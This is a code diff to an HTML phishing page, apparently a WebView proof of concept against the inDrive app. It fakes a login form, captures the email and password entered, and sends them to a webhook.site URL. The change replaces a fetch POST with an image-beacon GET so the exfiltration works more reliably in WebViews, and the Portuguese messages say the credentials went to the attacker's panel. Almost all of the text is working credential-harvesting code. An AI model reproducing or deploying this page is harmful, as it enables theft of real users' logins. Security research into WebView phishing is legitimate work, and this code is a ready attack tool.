@@ -12,7 +12,7 @@
         button { width: 100%; padding: 14px; background: #0078d4; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
         button:hover { background: #0068b7; }
         .demo { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 25px; font-size: 15px; }
-        .success { margin-top: 20px; padding: 15px; background: #d4edda; color: #155724; border-radius: 8px; display: none; }
+        .success { margin-top: 25px; padding: 15px; background: #d4edda; color: #155724; border-radius: 8px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -28,13 +28,13 @@
             <button type="submit">Entrar</button>
         </form>
 
-        <div id="successBox" class="success">
-            ✅ Credenciais enviadas para o painel do atacante!
+        <div id="successBox" class="success" style="display:none;">
+            ✅ Credenciais enviadas para o webhook.site!
         </div>
     </div>
 
     <script>
-        const webhookUrl = "https://webhook.site/c4e06d2f-8cd7-4ef7-8e49-3225dca67314";
+        const webhook = "https://webhook.site/c4e06d2f-8cd7-4ef7-8e49-3225dca67314";
 
         document.getElementById('phishingForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -42,27 +42,17 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Envia as credenciais para o seu webhook.site
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    timestamp: new Date().toISOString(),
-                    email: email,
-                    password: password,
-                    source: "inDrive WebView PoC - Z Kamachi",
-                    user_agent: navigator.userAgent
-                })
-            })
-            .then(() => {
-                document.getElementById('successBox').style.display = 'block';
-            })
-            .catch(() => {
-                alert("Credenciais capturadas (webhook falhou, mas salvou localmente)");
-            });
+            // Envia via GET (método mais compatível com WebView)
+            const url = `${webhook}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&time=${Date.now()}`;
 
-            // Mensagem de sucesso
-            alert(`✅ Credenciais capturadas!\n\nEmail: ${email}\nSenha: ${password}\n\nAgora olhe na aba do webhook.site`);
+            // Usa Image beacon (funciona melhor em WebViews)
+            const img = new Image();
+            img.src = url;
+
+            // Mostra sucesso na tela
+            document.getElementById('successBox').style.display = 'block';
+
+            alert(`✅ Credenciais enviadas!\n\nEmail: ${email}\nSenha: ${password}\n\nAgora olhe na aba do webhook.site`);
         });
     </script>
 </body>
